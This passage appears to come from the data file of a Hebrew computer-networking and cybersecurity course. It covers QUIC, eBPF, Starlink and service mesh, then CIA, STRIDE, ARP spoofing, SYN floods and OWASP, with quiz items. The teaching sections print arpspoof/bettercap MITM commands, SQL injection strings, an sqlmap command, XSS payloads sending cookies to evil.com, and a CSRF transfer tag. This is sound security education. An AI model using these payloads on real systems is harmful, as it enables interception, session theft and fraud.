            a: "האתר מצייר טקסט/צורות ב-canvas HTML. כל GPU/OS/גרסת דפדפן מצייר פיקסלים מעט שונים. ה-hash של התמונה ייחודי לציוד שלך. קשה להגן כי: אין לדעת מתי אתר עושה זאת (JavaScript מוסתר), ומניעה דורשת randomization שמשבש פונקציות לגיטימיות."
          },
          {
            q: "כיצד Onion Routing מבטיח ש-ISP שלך לא יודע לאיזה אתר גלשת?",
            a: "מחשבך שולח לGuard node בלבד — encrypted לשלוש שכבות. ה-ISP רואה שיחה עם Guard node. Guard לא יודע מה בפנים. רק Exit node יכול לפתוח את היעד הסופי — אבל Exit לא יודע מי שלח. ISP רואה: 'התחברת ל-Tor'. לא מה ביקשת."
          }
        ]
      }
    ]
  },
  {
    id: 26,
    title: "העתיד כבר כאן – QUIC, eBPF ו-Edge",
    pages: [
      {
        type: "explanation",
        title: "QUIC – הפרוטוקול שהחליף TCP",
        content: `
          <p><strong>QUIC</strong> פותח ב-Google ב-2012, הפך לסטנדרט IETF (RFC 9000) ב-2021. הוא הבסיס ל-HTTP/3. היום: ~25% מתנועת האינטרנט רצה על QUIC.</p>
          <p><strong>מה QUIC פותר?</strong></p>
          <table class="content-table">
            <tr><th>בעיה ב-TCP/TLS</th><th>פתרון QUIC</th></tr>
            <tr><td>Handshake = 3-way TCP + TLS 1.3 = 2 round trips</td><td>0-RTT / 1-RTT — connection + crypto ב-round trip אחד</td></tr>
            <tr><td>HOL Blocking: חבילה אחת אבודה עוצרת כולם</td><td>Streams עצמאיים — חבילה אבודה משפיעה רק על stream אחד</td></tr>
            <tr><td>TCP ב-kernel — קשה לעדכן ולשנות</td><td>QUIC ב-userspace — Google עדכנה מהר ב-Chrome ובשרתים</td></tr>
            <tr><td>Connection tied to IP:Port — מנותק בשינוי WiFi</td><td>Connection ID — נשאר connected גם אחרי שינוי IP (roaming)</td></tr>
          </table>
          <div class="diagram-container">
            <svg viewBox="0 0 360 100" class="content-diagram">
              <rect x="10" y="10" width="155" height="80" rx="6" fill="#fef2f2" stroke="#f87171"/>
              <text x="87" y="28" text-anchor="middle" font-size="9" font-weight="bold" fill="#dc2626">TCP + TLS 1.3</text>
              <text x="87" y="43" text-anchor="middle" font-size="8" fill="#dc2626">RTT 1: SYN → SYN-ACK</text>
              <text x="87" y="55" text-anchor="middle" font-size="8" fill="#dc2626">RTT 2: TLS ClientHello</text>
              <text x="87" y="67" text-anchor="middle" font-size="8" fill="#dc2626">RTT 3: TLS Finished</text>
              <text x="87" y="82" text-anchor="middle" font-size="8" fill="#dc2626">→ 3 round trips</text>
              <rect x="195" y="10" width="155" height="80" rx="6" fill="#d1fae5" stroke="#34d399"/>
              <text x="272" y="28" text-anchor="middle" font-size="9" font-weight="bold" fill="#065f46">QUIC (HTTP/3)</text>
              <text x="272" y="43" text-anchor="middle" font-size="8" fill="#065f46">RTT 1: QUIC Initial (crypto+data)</text>
              <text x="272" y="55" text-anchor="middle" font-size="8" fill="#065f46">→ connection מוכן</text>
              <text x="272" y="67" text-anchor="middle" font-size="8" fill="#065f46">0-RTT reconnect</text>
              <text x="272" y="82" text-anchor="middle" font-size="8" fill="#065f46">→ 0-1 round trips</text>
            </svg>
          </div>
          <p><strong>0-RTT:</strong> אם כבר שוחחת עם שרת — QUIC שומר session ticket. בבקשה הבאה, שולח נתונים כבר ב-packet הראשון. פותח דף web לפני TCP אפילו יצר חיבור.</p>
        `
      },
      {
        type: "explanation",
        title: "eBPF – תכנות ה-Kernel ללא תכנות Kernel",
        content: `
          <p><strong>eBPF</strong> (extended Berkeley Packet Filter) — אחד מהשינויים המהפכניים ביותר ב-Linux בעשור האחרון. מאפשר להריץ קוד <strong>בתוך</strong> Linux kernel — בלי לכתוב kernel module, בלי reboot, בבטיחות מוחלטת.</p>
          <p><strong>הרעיון:</strong> BPF ישן (1992) — סינון packets ב-tcpdump. eBPF (2014+) — JIT-compiled bytecode שרץ ב-kernel בcontext של event: network packet, syscall, function call, timer.</p>
          <p><strong>למה זה מהפכני לרשתות:</strong></p>
          <ul>
            <li><strong>XDP (eXpress Data Path):</strong> עיבוד packet <em>לפני</em> ה-kernel network stack — מיליוני pps</li>
            <li><strong>Cilium:</strong> CNI לKubernetes שמחליף iptables בeBPF. תוצאה: 10x ביצועים, monitoring מובנה</li>
            <li><strong>Cloudflare:</strong> DDoS mitigation שלהם רץ על eBPF/XDP — drop ב-line-rate ב-wire</li>
          </ul>
          <div class="code-preview">
            <pre><code>// eBPF XDP program — drop כל UDP מ-IP מסוים:
SEC("xdp")
int block_udp(struct xdp_md *ctx) {
    // גישה ישירה ל-packet ב-kernel
    struct ethhdr *eth = data;
    struct iphdr *ip = data + sizeof(*eth);
    if (ip->protocol == IPPROTO_UDP &&
        ip->saddr == htonl(0xC0A80101)) {
        return XDP_DROP; // drop לפני kernel stack
    }
    return XDP_PASS;
}</code></pre>
          </div>
          <p><strong>Meta, Google, Netflix, Cloudflare</strong> כולן השקיעו ב-eBPF. זה הבסיס לinfrastructure observability מודרנית — <strong>trace כל syscall, כל network call, בלי שינוי קוד</strong>.</p>
        `
      },
      {
        type: "explanation",
        title: "Starlink – אינטרנט מהחלל",
        content: `
          <p>SpaceX Starlink: ~6,000 לווינים ב-Low Earth Orbit (LEO, 550km), עם תוכנית ל-42,000. ה-constellation הגדולה ביותר בהיסטוריה.</p>
          <p><strong>למה LEO ולא GEO?</strong></p>
          <table class="content-table">
            <tr><th></th><th>GEO (35,786km)</th><th>LEO (550km)</th></tr>
            <tr><td>Latency</td><td>600ms+ RTT</td><td>20-40ms RTT</td></tr>
            <tr><td>לווינים נדרשים</td><td>3 מכסים את כל כדור הארץ</td><td>אלפים (תמיד עצים)</td></tr>
            <tr><td>bandwidth per user</td><td>נמוך יחסית</td><td>50-200 Mbps</td></tr>
            <tr><td>גישה לאזורים נידחים</td><td>✓</td><td>✓</td></tr>
          </table>
          <p><strong>איך Starlink מנתב:</strong> ה-user terminal (dish) מתחבר ל-satellite שמעל. הlaser inter-satellite links (ISL) מנתבים בין לווינים כמו BGP בחלל. ה-traffic יורד ל-ground station ממנה עולה לאינטרנט.</p>
          <div class="diagram-container">
            <svg viewBox="0 0 360 100" class="content-diagram">
              <ellipse cx="180" cy="90" rx="170" ry="15" fill="var(--accent-soft)" stroke="var(--accent)" opacity="0.5"/>
              <text x="180" y="93" text-anchor="middle" font-size="8">כדור הארץ</text>
              <circle cx="60" cy="30" r="8" fill="#0891b2" stroke="#0e7490"/>
              <text x="60" y="18" text-anchor="middle" font-size="7" fill="#0e7490">LEO</text>
              <circle cx="180" cy="15" r="8" fill="#0891b2" stroke="#0e7490"/>
              <text x="180" y="8" text-anchor="middle" font-size="7" fill="#0e7490">LEO</text>
              <circle cx="300" cy="30" r="8" fill="#0891b2" stroke="#0e7490"/>
              <text x="300" y="18" text-anchor="middle" font-size="7" fill="#0e7490">LEO</text>
              <line x1="68" y1="34" x2="172" y2="19" stroke="#0891b2" stroke-width="1.5" stroke-dasharray="3,2"/>
              <line x1="188" y1="19" x2="292" y2="34" stroke="#0891b2" stroke-width="1.5" stroke-dasharray="3,2"/>
              <line x1="60" y1="38" x2="80" y2="76" stroke="var(--accent)" stroke-width="1.5"/>
              <rect x="70" y="75" width="25" height="10" rx="2" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="82" y="83" text-anchor="middle" font-size="7">dish</text>
              <text x="180" y="60" text-anchor="middle" font-size="8" fill="var(--text-muted)">ISL: laser link בין לווינים</text>
            </svg>
          </div>
          <p><strong>שימושים שמשנים חיים:</strong> כפרים ללא fiber, ספינות, מטוסים, אזורי אסון, אוקראינה במלחמה (Starlink = infrastructure קריטית). <strong>חסרון:</strong> גשם/עננות מפריע, עלות גבוהה, concerns על space debris ו-light pollution.</p>
        `
      },
      {
        type: "explanation",
        title: "Service Mesh ו-Zero Trust בEnterprises",
        content: `
          <p>בעולם ה-microservices — לא מספיק לאבטח את ה-perimeter. כל service צריך לאמת כל request. זה <strong>Service Mesh</strong>.</p>
          <p><strong>sidecar proxy pattern:</strong></p>
          <ul>
            <li>כל pod ב-Kubernetes מקבל sidecar container (לרוב Envoy proxy)</li>
            <li>כל תנועה (in/out) עוברת דרך ה-sidecar</li>
            <li>mTLS אוטומטי: כל שיחה בין services מוצפנת + authenticated</li>
            <li>observability חינמית: metrics, traces, logs — בלי שינוי קוד</li>
          </ul>
          <div class="code-preview">
            <pre><code># Istio Service Mesh — traffic policy:
apiVersion: networking.istio.io/v1alpha3
kind: DestinationRule
metadata:
  name: payment-service
spec:
  host: payment-svc
  trafficPolicy:
    tls:
      mode: ISTIO_MUTUAL  # mTLS אוטומטי
  connectionPool:
    tcp:
      maxConnections: 100
  outlierDetection:
    consecutiveErrors: 3
    interval: 30s
    baseEjectionTime: 30s  # circuit breaker</code></pre>
          </div>
          <p><strong>Circuit Breaker pattern:</strong> אם service מחזיר errors — הmesh מפסיק לשלוח אליו ומחכה לrecovery. מונע cascading failures.</p>
          <p><strong>Zero Trust שמשולב עם Service Mesh:</strong> כל service מחזיקה certificate, כל request נאמת, policy מנוהל centrally. אפילו attacker בתוך cluster לא יכול לנוע laterally בקלות.</p>
        `
      },
      {
        type: "thinkOutside",
        title: "חשיבה מחוץ לקופסא – לאן הרשת הולכת",
        intro: "<p>כמה תחומים שיעצבו את הרשת בעשור הבא:</p>",
        blocks: [
          {
            title: "eBPF = מחליף iptables, routing, ועוד",
            icon: "🔧",
            content: `<p>iptables — הכלי שניהל את firewalls של Linux מ-1998 — מיועד לפנסיה. Cilium + eBPF מחליפים אותו בKubernetes. Meta מריצה <strong>Katran</strong> (load balancer מבוסס eBPF) שמטפל במאות מיליוני חיבורים. eBPF מאפשר observability שלא היה אפשרי — trace כל syscall בproduction בלי overhead. זה ה-TCP/IP של הדור הבא.</p>`
          },
          {
            title: "האינטרנט של האינטרנט של הדברים",
            icon: "📡",
            content: `<p>IPv6 נוצר ל-2^128 כתובות — מספיק לכל אטום על פני כדור הארץ פי מיליון. IoT = ≈15 מיליארד מכשירים מחוברים ב-2024, ≈30B ב-2030. כל מקרר, מנורה, חיישן — IP משלו. Thread (Matter), Zigbee, LoRaWAN — פרוטוקולי mesh networking למכשירים קטנים. הרשת עוברת מחיבור <em>מחשבים</em> לחיבור <em>עולם פיזי</em>.</p>`
          }
        ]
      },
      {
        type: "summary",
        title: "סיכום פרק 26",
        content: `
          <div class="chapter-summary">
            <h3>נקודות מפתח:</h3>
            <ul>
              <li>QUIC: UDP-based, 0-RTT, streams עצמאיים (אין HOL blocking), connection migration. בסיס HTTP/3</li>
              <li>eBPF: קוד ב-kernel בלי kernel module. XDP = עיבוד packet לפני network stack. Cilium, Cloudflare DDoS</li>
              <li>Starlink LEO: 550km, 20-40ms latency (vs. 600ms GEO). אלפי לווינים, ISL lasers בחלל</li>
              <li>Service Mesh: sidecar proxy, mTLS אוטומטי, circuit breaker, Zero Trust per-service</li>
              <li>eBPF מחליף iptables. IoT = 30B מכשירים ב-2030. הרשת מחברת עולם פיזי</li>
            </ul>
          </div>
        `
      },
      {
        type: "questions",
        title: "שאלות הבנה - פרק 26",
        questions: [
          {
            q: "מה ההבדל בין HTTP/2 ל-HTTP/3 מבחינת שכבת התעבורה?",
            a: "HTTP/2 רץ על TCP. חבילה אחת שאבדה — כל ה-streams מחכים (HOL blocking ברמת TCP). HTTP/3 רץ על QUIC/UDP. כל stream עצמאי גם ברמת transport. חבילה שאבדה משפיעה רק על stream אחד."
          },
          {
            q: "למה eBPF מהפכני לאבטחת רשתות?",
            a: "eBPF מריץ קוד בתוך kernel ב-XDP context — לפני שהpacket מגיע לnetwork stack. זה מאפשר drop/filter ב-line rate של hardware (מיליוני pps). קוד דינמי שניתן לעדכן בלי reboot. Cloudflare משתמשת בזה לDDoS mitigation. בנוסף — full observability של כל syscall בproduction ללא overhead."
          },
          {
            q: "מה בעיית HOL Blocking ב-TCP ואיך QUIC פותר אותה?",
            a: "HOL Blocking = Head-of-Line Blocking. TCP הוא stream אחד, ordered. אם חבילה 5 אבדה — חבילות 6,7,8 שכבר הגיעו מחכות בbuffer. כל multiplexing שמעל TCP (HTTP/2) סובל מזה. QUIC: כל stream הוא flow עצמאי ב-UDP. אובדן חבילה בstream A לא עוצר stream B."
          }
        ]
      }
    ]
  }
    ]
  },
  {
    id: 'cyber',
    title: 'אבטחת מידע',
    subtitle: 'Pentesting, CTF, SOC, Bug Bounty — מהבסיס למקצוען',
    icon: '🔐',
    color: '#ef4444',
    level: 'בינוני–מתקדם',
    chapters: [
  {
    id: 101,
    title: "CIA Triad — יסודות אבטחת מידע",
    pages: [
      {
        type: "explanation",
        title: "שלושת עמודי תווך",
        content: `<div dir="rtl">
<h2>CIA Triad — המודל שמנחה כל מחשבה בסייבר</h2>
<p>לפני שמדברים על כלים ותקיפות, חייבים להבין <em>מה</em> אנחנו מגינים. כל בעיית אבטחה ניתנת לסיווג לאחת משלוש קטגוריות:</p>
<div class="diagram-container">
<svg viewBox="0 0 360 150" class="content-diagram">
  <polygon points="180,15 30,135 330,135" fill="none" stroke="#64748b" stroke-width="2"/>
  <circle cx="180" cy="28" r="22" fill="#7f1d1d" stroke="#ef4444" stroke-width="2"/>
  <text x="180" y="24" text-anchor="middle" font-size="9" fill="#fca5a5" font-weight="bold">Confidentiality</text>
  <text x="180" y="36" text-anchor="middle" font-size="8" fill="#fca5a5">סודיות</text>
  <circle cx="65" cy="128" r="22" fill="#14532d" stroke="#22c55e" stroke-width="2"/>
  <text x="65" y="124" text-anchor="middle" font-size="9" fill="#86efac" font-weight="bold">Integrity</text>
  <text x="65" y="136" text-anchor="middle" font-size="8" fill="#86efac">שלמות</text>
  <circle cx="295" cy="128" r="22" fill="#1e3a5f" stroke="#3b82f6" stroke-width="2"/>
  <text x="295" y="124" text-anchor="middle" font-size="9" fill="#93c5fd" font-weight="bold">Availability</text>
  <text x="295" y="136" text-anchor="middle" font-size="8" fill="#93c5fd">זמינות</text>
  <text x="180" y="90" text-anchor="middle" font-size="10" fill="#94a3b8">CIA</text>
</svg>
</div>
<table class="content-table">
  <tr><th>עיקרון</th><th>הגדרה</th><th>איום נגדו</th><th>הגנה</th></tr>
  <tr><td><strong>Confidentiality</strong></td><td>רק מורשים יכולים לגשת למידע</td><td>Sniffing, Data Breach</td><td>הצפנה, ACL, MFA</td></tr>
  <tr><td><strong>Integrity</strong></td><td>המידע לא שונה ללא הרשאה</td><td>Tampering, Injection</td><td>Hash, Digital Signature, Audit Log</td></tr>
  <tr><td><strong>Availability</strong></td><td>המערכת זמינה כשצריך</td><td>DoS/DDoS, Ransomware</td><td>Redundancy, Rate Limiting, Backup</td></tr>
</table>
<p>כשאתה שומע על breach — שאל: <em>איזה עיקרון הופר?</em> ב-Equifax 2017: Confidentiality (147M רשומות). ב-NotPetya: Availability (חברות שלמות ירדו). ב-SolarWinds: Integrity (עדכון תוכנה שונה).</p>
</div>`
      },
      {
        type: "explanation",
        title: "STRIDE ו-Threat Modeling",
        content: `<div dir="rtl">
<h2>STRIDE — מיפוי איומים בשיטה</h2>
<p>Threat Modeling שואל: <em>מה יכול להשתבש?</em> Microsoft פיתחה את STRIDE בשנות ה-90 — ועדיין הכלי הטוב ביותר לניתוח סיסטמטי:</p>
<table class="content-table">
  <tr><th>אות</th><th>איום</th><th>דוגמה</th><th>הגנה</th></tr>
  <tr><td><strong>S</strong></td><td>Spoofing — התחזות</td><td>Email spoofing, ARP poisoning</td><td>אימות, SPF/DKIM, certificates</td></tr>
  <tr><td><strong>T</strong></td><td>Tampering — שינוי נתונים</td><td>SQL injection, MITM</td><td>Hashing, digital signatures, TLS</td></tr>
  <tr><td><strong>R</strong></td><td>Repudiation — הכחשה</td><td>"לא אני שלחתי את הפקודה"</td><td>Audit logs, digital signatures</td></tr>
  <tr><td><strong>I</strong></td><td>Info Disclosure — דליפת מידע</td><td>חשיפת error messages עם DB info</td><td>הצפנה, input validation</td></tr>
  <tr><td><strong>D</strong></td><td>Denial of Service</td><td>SYN flood, Slowloris</td><td>Rate limiting, CDN, WAF</td></tr>
  <tr><td><strong>E</strong></td><td>Elevation of Privilege</td><td>Buffer overflow → root access</td><td>Least privilege, sandboxing</td></tr>
</table>
<h3>Attack Surface Analysis</h3>
<p>Attack Surface = כל נקודות הכניסה האפשריות למערכת. כלל אצבע: <em>צמצם את ה-attack surface</em>.</p>
<ul>
<li>כל endpoint API שחשוף = attack surface</li>
<li>כל dependency (npm, pip) = attack surface</li>
<li>כל employee עם access = attack surface</li>
<li>כל port פתוח = attack surface</li>
</ul>
</div>`
      },
      {
        type: "story",
        title: "הסיפור: Target 2013 — 40M כרטיסי אשראי",
        content: `<div dir="rtl">
<h2>כשה-HVAC contractor הרס את Target</h2>
<p>נובמבר 2013, ארה"ב: Target, רשת קמעונאות ענקית, הותקפה. 40 מיליון כרטיסי אשראי נגנבו בשישה שבועות. עלות: $162M ישירים, $1B+ בנזקים עקיפים. CEO ו-CISO התפטרו.</p>
<p><strong>שלבי המתקפה (kill chain):</strong></p>
<ol>
<li><strong>Reconnaissance:</strong> התוקפים זיהו ש-Target עובדת עם vendor HVAC (Fazio Mechanical) שיש לו remote access לרשת לניטור מערכות חימום.</li>
<li><strong>Initial Access:</strong> Phishing email ל-Fazio → גנבו credentials → נכנסו לפורטל הvendor של Target.</li>
<li><strong>Lateral Movement:</strong> הרשת הפנימית של Target לא הייתה מפולחת. מה-vendor portal הגיעו ל-POS systems (מכשירי קופה).</li>
<li><strong>Payload:</strong> התקינו RAM scraper malware על עשרות אלפי מכשירי POS — הוא לכד את נתוני הכרטיס ברגע שהמגנט נקרא, לפני ההצפנה.</li>
<li><strong>Exfiltration:</strong> הנתונים יצאו דרך FTP servers שהוקמו בתוך הרשת של Target לשרתים ברוסיה.</li>
</ol>
<p><strong>מה שהיה צריך לעשות:</strong> Network segmentation — vendor access לרשת נפרדת שלא יכולה לגעת ב-POS. זה הכישלון הבסיסי ביותר בDefense in Depth.</p>
</div>`
      }
    ]
  },
  {
    id: 102,
    title: "מתקפות רשת — TCP/IP כנשק",
    pages: [
      {
        type: "explanation",
        title: "ARP Spoofing ו-MITM",
        content: `<div dir="rtl">
<h2>ARP: הפרוטוקול שנוצר בלי לחשוב על אבטחה</h2>
<p>ARP (Address Resolution Protocol) ממפה IP לMAC. הבעיה: ARP stateless ו-trustless — כל מי ברשת יכול לשדר "אני 192.168.1.1, ה-MAC שלי הוא XX:XX".</p>
<div class="diagram-container">
<svg viewBox="0 0 360 140" class="content-diagram">
  <text x="180" y="14" text-anchor="middle" font-size="11" fill="#e2e8f0" font-weight="bold">ARP Spoofing — Man in the Middle</text>
  <rect x="10" y="25" width="70" height="25" rx="4" fill="#1e3a5f"/>
  <text x="45" y="41" text-anchor="middle" font-size="10" fill="#7dd3fc">Victim PC</text>
  <rect x="145" y="25" width="70" height="25" rx="4" fill="#7f1d1d"/>
  <text x="180" y="41" text-anchor="middle" font-size="10" fill="#fca5a5">Attacker</text>
  <rect x="280" y="25" width="70" height="25" rx="4" fill="#14532d"/>
  <text x="315" y="41" text-anchor="middle" font-size="10" fill="#86efac">Gateway</text>
  <line x1="80" y1="37" x2="145" y2="37" stroke="#ef4444" stroke-width="2"/>
  <text x="112" y="30" text-anchor="middle" font-size="8" fill="#ef4444">① Traffic →</text>
  <line x1="215" y1="37" x2="280" y2="37" stroke="#ef4444" stroke-width="2"/>
  <text x="247" y="30" text-anchor="middle" font-size="8" fill="#ef4444">② Forward →</text>
  <text x="45" y="75" text-anchor="middle" font-size="8" fill="#94a3b8">ARP Table:</text>
  <text x="45" y="87" text-anchor="middle" font-size="8" fill="#fca5a5">GW = ATTACKER MAC!</text>
  <text x="315" y="75" text-anchor="middle" font-size="8" fill="#94a3b8">ARP Table:</text>
  <text x="315" y="87" text-anchor="middle" font-size="8" fill="#fca5a5">Victim = ATTACKER MAC!</text>
  <text x="180" y="110" text-anchor="middle" font-size="9" fill="#f87171">Attacker שולח ARP replies מזויפים לשני הצדדים</text>
  <text x="180" y="125" text-anchor="middle" font-size="8" fill="#94a3b8">→ כל הטראפיק עובר דרכו (read, modify, inject)</text>
</svg>
</div>
<div class="code-preview"><pre><code># arpspoof (Linux) — MITM בסיסי
sudo arpspoof -i eth0 -t 192.168.1.5 192.168.1.1
# -t = target victim, כתובת ה-gateway

# הפעלת IP forwarding (כדי לא לנתק את הקורבן)
echo 1 > /proc/sys/net/ipv4/ip_forward

# כלי מקיף יותר: bettercap
sudo bettercap -iface eth0
# net.probe on; arp.spoof.targets 192.168.1.5; arp.spoof on</code></pre></div>
<p><strong>הגנה:</strong> Dynamic ARP Inspection (DAI) ב-managed switches, Static ARP entries לGateway, TLS (MITM לא עוזר אם הcert אינו חתום על ידי CA אמין).</p>
</div>`
      },
      {
        type: "explanation",
        title: "SYN Flood ו-TCP Exhaustion",
        content: `<div dir="rtl">
<h2>SYN Flood — ניצול TCP Handshake</h2>
<p>בTCP three-way handshake, שרת מקצה state (half-open connection) לכל SYN שמגיע. SYN Flood שולח מיליוני SYNs עם IP מזויף — השרת שומר מיליוני half-open entries ב-memory עד שהתור מלא.</p>
<div class="code-preview"><pre><code># TCP stack: כשמגיע SYN
1. הקצה memory לחיבור (Transmission Control Block)
2. שלח SYN-ACK
3. חכה לACK (מצב SYN_RCVD) — timeout כ-60 שניות!

# עם SYN Flood:
# - מיליוני SYNs ← מיליוני TCBs ב-memory
# - ה-backlog queue מלא
# - חיבורים לגיטימיים נדחים (SYN-ACK לא נשלח)</code></pre></div>
<h3>SYN Cookies — הפתרון</h3>
<p>במקום לשמור state, השרת מקודד את המידע ב-ISN (Initial Sequence Number) של ה-SYN-ACK. רק כשמגיע ACK אמיתי — שחזור ה-state. מי ששלח IP מזויף לא יכול לשלוח ACK.</p>
<div class="code-preview"><pre><code># בדיקה ב-Linux
sysctl net.ipv4.tcp_syncookies
# 1 = מופעל (ברירת מחדל בלינוקס מודרני)

# הגנה נוספת — הקטנת backlog timeout
sysctl net.ipv4.tcp_synack_retries
# ברירת מחדל 5 (320s!) — הורד ל-2</code></pre></div>
</div>`
      },
      {
        type: "story",
        title: "הסיפור: DDoS של 3.47 Tbps",
        content: `<div dir="rtl">
<h2>הDDoS הגדול בהיסטוריה — ועדיין נשארנו online</h2>
<p>ינואר 2022: Microsoft דיווחה על DDoS attack של <strong>3.47 Tbps</strong> על לקוח שלהם (Azure). זה שיא עולמי. 10,000 sources ב-10 מדינות. משך: 15 דקות.</p>
<p><strong>הוקטורים שנוצלו:</strong></p>
<ul>
<li>UDP Reflection via CLDAP, DNS, NTP — שולחים UDP packet קטן לservers ציבוריים עם spoofed IP של הקורבן → הservers מחזירים תגובה גדולה x100 לקורבן</li>
<li>Amplification factor של DNS: קבצי request 40 bytes → response 3,000 bytes (75x amplification)</li>
</ul>
<p><strong>מה Azure עשה:</strong> Azure DDoS Protection tier מזהה ומנקה traffic ברמה של network edge — לפני שהpackets מגיעים ל-server. Anycast scrubbing centers בכל העולם.</p>
<p><strong>הלקח:</strong> DDoS מוגן ב-scale בלבד. אי אפשר "לבנות שרת גדול מספיק". הפתרון הוא distributed scrubbing infrastructure — Cloudflare, Azure DDoS Protection, AWS Shield Advanced. בלי זה, כל חברה פגיעה.</p>
</div>`
      }
    ]
  },
  {
    id: 103,
    title: "OWASP Top 10 — פגיעויות Web",
    pages: [
      {
        type: "explanation",
        title: "SQL Injection — הקלאסיקה",
        content: `<div dir="rtl">
<h2>SQL Injection — פגיעות #1 במשך 20 שנה</h2>
<p>SQL Injection מתרחשת כשקלט של משתמש מוזרק ישירות ל-SQL query ללא סניטציה. התוצאה: התוקף כותב SQL עצמו.</p>
<div class="code-preview"><pre><code>// קוד פגיע — NEVER DO THIS
const query = "SELECT * FROM users WHERE email='" + email + "' AND password='" + password + "'";

// Input של תוקף:
// email: admin@site.com'--
// password: anything

// SQL שנוצר:
// SELECT * FROM users WHERE email='admin@site.com'--' AND password='anything'
// ה-- הופך כל השאר לcomment — מחזיר admin ללא password!

// ====== Parameterized Queries — הפתרון ======
const query = "SELECT * FROM users WHERE email=? AND password=?";
db.execute(query, [email, hashedPassword]); // SAFE</code></pre></div>
<h3>SQLi Variants</h3>
<table class="content-table">
  <tr><th>סוג</th><th>עובד איך</th><th>דוגמה</th></tr>
  <tr><td>Classic</td><td>תגובת שגיאה מחזירה נתונים</td><td>' OR '1'='1</td></tr>
  <tr><td>Blind Boolean</td><td>שינוי תוכן דף (true/false)</td><td>' AND 1=1-- (vs AND 1=2--)</td></tr>
  <tr><td>Time-based Blind</td><td>עיכוב תגובה = true</td><td>'; IF(1=1) WAITFOR DELAY '5s'--</td></tr>
  <tr><td>Union-based</td><td>חיבור query נוסף</td><td>' UNION SELECT username,password FROM users--</td></tr>
</table>
<p><strong>כלי:</strong> sqlmap מבצע SQLi אוטומטית: <code>sqlmap -u "https://target.com/search?q=1" --dbs</code></p>
</div>`
      },
      {
        type: "explanation",
        title: "XSS ו-CSRF",
        content: `<div dir="rtl">
<h2>XSS — הזרקת JavaScript לדפדפן של הקורבן</h2>
<p>Cross-Site Scripting מתרחש כשאפליקציה מחזירה input של משתמש ב-HTML ללא escaping:</p>
<div class="code-preview"><pre><code>// Reflected XSS — ב-URL:
https://site.com/search?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>

// Stored XSS — שמור בDB (הכי מסוכן):
// תוקף מגיב לפוסט עם:
<img src=x onerror="fetch('https://evil.com/?c='+btoa(document.cookie))">
// כל מי שרואה את התגובה — נגנב ה-cookie שלו

// הגנה:
// 1. HTML escape: & → &amp; < → &lt; > → &gt;
// 2. Content Security Policy (CSP) header
// 3. HttpOnly cookies (JavaScript לא יכול לקרוא)</code></pre></div>
<h3>CSRF — Cross-Site Request Forgery</h3>
<p>CSRF מנצל שהדפדפן שולח cookies אוטומטית לכל request לאותו domain:</p>
<div class="code-preview"><pre><code><!-- באתר זדוני — תוקף שולח לכם לinк -->
<img src="https://bank.com/transfer?to=attacker&amount=10000" width="0">
<!-- אם אתם מחוברים לbank.com — הבקשה תועבר עם ה-cookie שלכם! -->

<!-- הגנה: CSRF Token — ערך ייחודי שה-server שולח בform -->
<input type="hidden" name="csrf_token" value="x8f3...">
<!-- Server מאמת שהtoken תואם — אתר זדוני לא יכול לדעת את הtoken --></code></pre></div>
</div>`
      },
      {
        type: "explanation",
        title: "OWASP Top 10 — הרשימה המלאה",
        content: `<div dir="rtl">
<h2>OWASP Top 10 — 2021</h2>
<p>OWASP (Open Worldwide Application Security Project) מפרסמת רשימה של 10 הסיכונים הנפוצים ביותר:</p>
<table class="content-table">
  <tr><th>#</th><th>קטגוריה</th><th>דוגמה</th></tr>
  <tr><td>A01</td><td>Broken Access Control</td><td>IDOR — גישה לdata של user אחר ע"י שינוי ID</td></tr>
  <tr><td>A02</td><td>Cryptographic Failures</td><td>אחסון passwords בplaintext, HTTP במקום HTTPS</td></tr>
  <tr><td>A03</td><td>Injection</td><td>SQL, NoSQL, OS Command, LDAP injection</td></tr>
  <tr><td>A04</td><td>Insecure Design</td><td>חוסר threat modeling בשלב העיצוב</td></tr>
  <tr><td>A05</td><td>Security Misconfiguration</td><td>Default passwords, open S3 buckets, verbose errors</td></tr>
  <tr><td>A06</td><td>Vulnerable Components</td><td>Log4Shell, npm packages עם CVEs</td></tr>
  <tr><td>A07</td><td>Auth & Session Failures</td><td>Weak passwords, session fixation, JWT none alg</td></tr>
  <tr><td>A08</td><td>Software Integrity Failures</td><td>SolarWinds — update pipeline compromise</td></tr>
  <tr><td>A09</td><td>Logging & Monitoring Failures</td><td>ללא logs ← לא יודעים שנפרצנו</td></tr>
  <tr><td>A10</td><td>SSRF</td><td>Server fetches URLs מInput — חשיפת AWS metadata</td></tr>
</table>
<p><strong>IDOR דוגמה (A01):</strong> <code>GET /api/orders/1234</code> — מה אם תנסה <code>/api/orders/1235</code>? אם אין access control — קיבלת הזמנה של אחר.</p>
</div>`
      }
    ]
  },
  {
    id: 104,
    title: "Penetration Testing — מתודולוגיה",
    pages: [
      {
        type: "explanation",
        title: "Pentest Lifecycle",
        content: `<div dir="rtl">
<h2>מה זה Penetration Testing ולמה זה שונה מhacking</h2>
<p>Pentesting הוא תקיפה <em>מורשית</em> — scope מוגדר, חוזה משפטי, מטרה: מצא חולשות לפני התוקפים האמיתיים.</p>
<div class="diagram-container">
<svg viewBox="0 0 360 80" class="content-diagram">
  <rect x="5" y="20" width="60" height="40" rx="5" fill="#1e3a5f"/>
  <text x="35" y="37" text-anchor="middle" font-size="8" fill="#7dd3fc">1. Recon</text>
  <text x="35" y="50" text-anchor="middle" font-size="7" fill="#94a3b8">מידע פסיבי</text>
  <line x1="65" y1="40" x2="75" y2="40" stroke="#64748b" stroke-width="1.5" marker-end="url(#a)"/>
  <rect x="75" y="20" width="60" height="40" rx="5" fill="#14532d"/>
  <text x="105" y="37" text-anchor="middle" font-size="8" fill="#86efac">2. Scanning</text>
  <text x="105" y="50" text-anchor="middle" font-size="7" fill="#94a3b8">Nmap, Nessus</text>
  <line x1="135" y1="40" x2="145" y2="40" stroke="#64748b" stroke-width="1.5" marker-end="url(#a)"/>
  <rect x="145" y="20" width="60" height="40" rx="5" fill="#4c1d95"/>
  <text x="175" y="37" text-anchor="middle" font-size="8" fill="#c4b5fd">3. Exploit</text>
  <text x="175" y="50" text-anchor="middle" font-size="7" fill="#94a3b8">Metasploit</text>
  <line x1="205" y1="40" x2="215" y2="40" stroke="#64748b" stroke-width="1.5" marker-end="url(#a)"/>
  <rect x="215" y="20" width="60" height="40" rx="5" fill="#78350f"/>
  <text x="245" y="37" text-anchor="middle" font-size="8" fill="#fcd34d">4. Post-Exp</text>
